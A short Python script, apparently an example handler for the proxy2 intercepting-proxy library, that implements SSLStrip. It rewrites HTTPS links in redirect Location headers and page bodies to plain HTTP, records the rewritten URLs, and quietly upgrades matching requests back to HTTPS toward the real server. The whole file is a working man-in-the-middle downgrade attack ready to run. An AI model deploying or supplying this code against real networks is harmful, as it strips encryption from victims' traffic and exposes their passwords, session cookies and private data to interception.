#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSLStrip – converts HTTPS links to HTTP.
Maintains a queue of replaced URLs to handle redirects correctly.
"""
import sys
import os
import re
from collections import deque

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from proxy2 import ProxyRequestHandler, test

class SSLStripRequestHandler(ProxyRequestHandler):
    """Convert HTTPS links to HTTP in both Location headers and response bodies."""
    
    replaced_urls = deque(maxlen=1024)  # thread-safe because of handler lock
    
    def request_handler(self, req, req_body):
        """If a URL was previously replaced, upgrade back to HTTPS for upstream."""
        if req.path in self.replaced_urls:
            req.path = req.path.replace('http://', 'https://')
            if self.verbose:
                print(f"[SSLStrip] Upgraded request back to HTTPS: {req.path}")
    
    def response_handler(self, req, req_body, res, res_body):
        """
        Replace https:// URLs with http:// in:
        - Location headers (redirects)
        - Response body (HTML, etc.)
        """
        def replacefunc(m):
            http_url = "http://" + m.group(1)
            self.replaced_urls.append(http_url)
            return http_url
        
        # Pattern matches https:// URLs (no trailing quote/space)
        re_https_url = r"https://([-_.!~*'()a-zA-Z0-9;/?:@&=+$,%#]+)"
        
        # 1. Modify Location header (redirects)
        if 'Location' in res.headers:
            old = res.headers['Location']
            new = re.sub(re_https_url, replacefunc, old)
            if old != new:
                res.headers['Location'] = new
                if self.verbose:
                    print(f"[SSLStrip] Rewrote Location: {old} -> {new}")
        
        # 2. Modify response body
        if res_body and isinstance(res_body, bytes):
            body_text = res_body.decode('utf-8', errors='replace')
            body_text = re.sub(re_https_url, replacefunc, body_text)
            return body_text.encode('utf-8')
        elif res_body and isinstance(res_body, str):
            return re.sub(re_https_url, replacefunc, res_body)
        
        return None  # no modification


if __name__ == '__main__':
    test(HandlerClass=SSLStripRequestHandler)
